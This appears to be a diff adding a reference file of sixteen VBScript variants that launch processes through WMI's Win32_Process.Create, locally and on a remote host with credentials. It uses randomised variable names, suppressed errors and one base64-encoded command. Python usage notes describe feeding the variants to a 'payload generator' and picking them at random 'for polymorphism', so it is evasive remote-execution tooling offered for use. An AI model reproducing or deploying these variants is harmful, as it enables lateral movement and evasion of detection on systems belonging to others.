@@ -1,0 +1,400 @@
+================================================================================
+WMI LOCATOR CONNECTION VARIANTS - COMPLETE REFERENCE
+================================================================================
+
+This document contains all 16 WMI locator connection variants with complete
+code examples. Each variant demonstrates a different approach to WMI connection
+configuration, targeting, and authentication.
+
+================================================================================
+LOCAL CONNECTIONS
+================================================================================
+
+
+[LOCAL-1] LOCAL_DOT
+Description: Local connection using dot (.) notation
+Type: local
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\cimv2")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[LOCAL-2] LOCAL_LOCALHOST
+Description: Local connection using 'localhost' string
+Type: local
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer("localhost", "root\cimv2")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[LOCAL-3] LOCAL_127001
+Description: Local connection using 127.0.0.1 loopback
+Type: local
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer("127.0.0.1", "root\cimv2")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+================================================================================
+REMOTE CONNECTIONS
+================================================================================
+
+[REMOTE-1] REMOTE_IP
+Description: Remote connection using IP address (example)
+Type: remote
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer("192.168.1.100", "root\cimv2")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[REMOTE-2] REMOTE_AUTHENTICATED
+Description: Remote connection with username/password
+Type: remote_auth
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer("192.168.1.100", "root\cimv2", "admin", "password")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[REMOTE-3] ENCODED_REMOTE
+Description: Remote connection with base64 encoded command
+Type: remote_obfuscated
+--------------------------------------------------------------------------------
+Function DecodeBase64(encoded)
+    Dim xmlDoc, node
+    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+    Set node = xmlDoc.CreateElement("tmp")
+    node.DataType = "bin.base64"
+    node.Text = encoded
+    DecodeBase64 = node.NodeTypedValue
+End Function
+
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip, encCmd_zhxeULXb
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer("192.168.1.100", "root\cimv2")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+encCmd_zhxeULXb = DecodeBase64("Y21kLmV4ZSAvYyBpcGNvbmZpZw==")
+objSvc_lcXXERqj.Create encCmd_zhxeULXb
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+================================================================================
+NAMESPACE VARIANTS
+================================================================================
+
+[NAMESPACE-1] WINMGMT_NAMESPACE
+Description: Connection using winmgmt root namespace
+Type: namespace
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "\\\\.\\root\\cimv2")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[NAMESPACE-2] WDM_NAMESPACE
+Description: Connection using WDM (driver model) namespace
+Type: namespace
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\\WDM")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[NAMESPACE-3] DCIM_NAMESPACE
+Description: Connection using DCIM namespace
+Type: namespace
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\\dcim")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[NAMESPACE-4] HARDWARE_NAMESPACE
+Description: Connection using hardware namespace
+Type: namespace
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\\hardware")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[NAMESPACE-5] CIMV1_NAMESPACE
+Description: Connection using CIMv1 (legacy) namespace
+Type: namespace
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\\cimv1")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[NAMESPACE-6] DEFAULT_NAMESPACE
+Description: Connection with empty namespace (default cimv2)
+Type: namespace
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[NAMESPACE-7] FULL_PATH_NAMESPACE
+Description: Connection using full UNC-style path
+Type: namespace
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "\\\\root\\cimv2")
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+================================================================================
+SECURITY CONFIGURATION VARIANTS
+================================================================================
+
+[SECURITY-1] IMPERSONATION_LEVEL
+Description: Connection with impersonation level (delegate=3)
+Type: security
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\cimv2")
+objConn_PZSQDGtB.Security_.ImpersonationLevel = 3
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[SECURITY-2] AUTHENTICATION_LEVEL
+Description: Connection with packet-level authentication
+Type: security
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\cimv2")
+objConn_PZSQDGtB.Security_.AuthenticationLevel = 6
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+[SECURITY-3] SECURITY_FLAGS
+Description: Connection with security flags enabled
+Type: security
+--------------------------------------------------------------------------------
+Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip
+On Error Resume Next
+Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")
+Set objConn_PZSQDGtB = objLoc_XlEPcPkm.ConnectServer(".", "root\cimv2", "", "", "", "", 128)
+Set objSvc_lcXXERqj = objConn_PZSQDGtB.Get("Win32_Process")
+objSvc_lcXXERqj.Create "cmd.exe /c ipconfig"
+Set objProc_DUrjHiip = Nothing
+Set objSvc_lcXXERqj = Nothing
+Set objConn_PZSQDGtB = Nothing
+Set objLoc_XlEPcPkm = Nothing
+On Error GoTo 0
+
+
+================================================================================
+VARIANT SUMMARY TABLE
+================================================================================
+
+Total Variants: 16
+
+Breakdown by Type:
+  - local: 3 variants
+  - namespace: 7 variants
+  - remote: 1 variants
+  - remote_auth: 1 variants
+  - remote_obfuscated: 1 variants
+  - security: 3 variants
+
+================================================================================
+QUICK REFERENCE
+================================================================================
+
+Variant ID | Type | Description
+--------------------------------------------------------------------------------
+authentication_level | security        | Connection with packet-level authenticat
+cimv1_namespace      | namespace       | Connection using CIMv1 (legacy) namespac
+dcim_namespace       | namespace       | Connection using DCIM namespace
+default_namespace    | namespace       | Connection with empty namespace (default
+encoded_remote       | remote_obfuscated | Remote connection with base64 encoded co
+full_path_namespace  | namespace       | Connection using full UNC-style path
+hardware_namespace   | namespace       | Connection using hardware namespace
+impersonation_level  | security        | Connection with impersonation level (del
+local_127001         | local           | Local connection using 127.0.0.1 loopbac
+local_dot            | local           | Local connection using dot (.) notation
+local_localhost      | local           | Local connection using 'localhost' strin
+remote_authenticated | remote_auth     | Remote connection with username/password
+remote_ip            | remote          | Remote connection using IP address (exam
+security_flags       | security        | Connection with security flags enabled
+wdm_namespace        | namespace       | Connection using WDM (driver model) name
+winmgmt_namespace    | namespace       | Connection using winmgmt root namespace
+
+================================================================================
+USAGE EXAMPLES
+================================================================================
+
+
+Python Usage:
+=============
+
+# Import the generator
+from wmi_locator_variants import WMILocatorVariantGenerator
+
+# Create instance
+gen = WMILocatorVariantGenerator()
+
+# Generate single variant
+code = gen.generate_local_dot_connection("calc.exe")
+print(code)
+
+# Generate all variants
+variants = gen.generate_all_variants("whoami")
+for variant_id, info in variants.items():
+    print(f"{variant_id}: {info['code']}")
+
+# Generate specific variant types
+code = gen.generate_authenticated_connection("cmd.exe", "192.168.1.100", "admin", "pass")
+code = gen.generate_impersonation_connection("powershell.exe")
+code = gen.generate_wdm_namespace_connection("tasklist")
+
+Integration with Existing Code:
+===============================
+
+# Add to payload generator
+from wmi_locator_variants import WMILocatorVariantGenerator
+gen = WMILocatorVariantGenerator()
+all_variants = gen.generate_all_variants(command)
+
+# Select random variant for polymorphism
+import random
+selected = random.choice(list(all_variants.values()))
+payload = selected["code"]
+
+Filtering and Selection:
+=======================
+
+# Get only local variants
+variants = gen.generate_all_variants("cmd.exe")
+local_only = {k: v for k, v in variants.items() if v["type"] == "local"}
+
+# Get only remote variants
+remote_only = {k: v for k, v in variants.items() if "remote" in v["type"]}
+
+# Get namespace variants
+namespace_only = {k: v for k, v in variants.items() if v["type"] == "namespace"}
+
